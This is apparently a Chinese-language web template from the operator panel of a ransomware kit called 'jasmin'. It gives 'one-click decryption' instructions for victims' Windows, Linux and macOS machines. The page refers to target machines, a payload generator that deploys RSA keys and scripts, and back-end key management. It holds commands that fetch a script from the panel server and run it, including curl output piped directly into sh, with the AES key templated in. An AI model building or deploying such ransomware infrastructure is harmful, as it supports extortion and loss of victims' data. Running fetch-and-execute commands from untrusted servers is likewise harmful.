解密教程

🖥️ Windows 一键解密

1在目标机打开 PowerShell (管理员)
2点击命令框右上角「复制」按钮，粘贴到终端运行
自动下载私钥+解密器、执行解密、清理临时文件
:: 纯 PowerShell 实现，无需编译 exe
:: 要求 PowerShell 7+   (未装可执行: winget install Microsoft.PowerShell)
curl.exe -sL {{ request.url_root }}payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
pwsh -File jasmin_unlock.ps1 -Server {{ request.url_root }} -K "{{ aes_key }}"
:: -Paths 换成要解密的目录；不写则解密当前目录

🐧 Linux 一键解密

1在目标机打开终端
2点击命令框右上角「复制」按钮，粘贴到终端运行
自动安装依赖、下载私钥和脚本、全盘解密、清理
# Linux 一键解密 — 纯 openssl，零依赖（无需 pip / cryptography）
# 末尾加上要解密的目录；不写则解密当前目录
curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}"

# 只需解特定目录时，在末尾追加（可多个）
curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /data /home

🍎 macOS 一键解密

1打开终端
2点击命令框右上角「复制」按钮，粘贴到终端运行
# macOS 一键解密 — 纯 openssl，零依赖（macOS 自带 openssl）
# 末尾加上要解密的目录；不写则解密当前目录
curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}"

# 只需解特定目录时，在末尾追加（可多个）
curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /Users /tmp
准备: 在「载荷生成器」点击「生成RSA密钥对」，加密私钥(.pem.enc)与解密脚本会自动部署到 payloads/ 目录；明文私钥与解密口令需登录后台后经「密钥管理」下载
